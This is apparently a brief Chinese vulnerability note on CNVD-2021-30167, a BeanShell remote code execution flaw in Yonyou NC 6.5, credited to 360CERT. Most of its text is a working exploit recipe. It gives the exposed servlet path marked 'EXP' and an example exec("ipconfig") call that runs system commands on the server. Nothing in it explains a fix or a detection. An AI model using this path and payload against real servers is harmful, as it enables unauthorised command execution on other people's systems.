# CNVD-2021-30167: 用友NC BeanShell远程代码执行

影响版本：  
- 用友NC 6.5

EXP：
```
/servlet/~ic/bsh.servlet.BshServlet
```

eg:
```
exec("ipconfig")
```
[@360CERT](https://mp.weixin.qq.com/s/DMmzcahya-WU8CW1b2TABQ)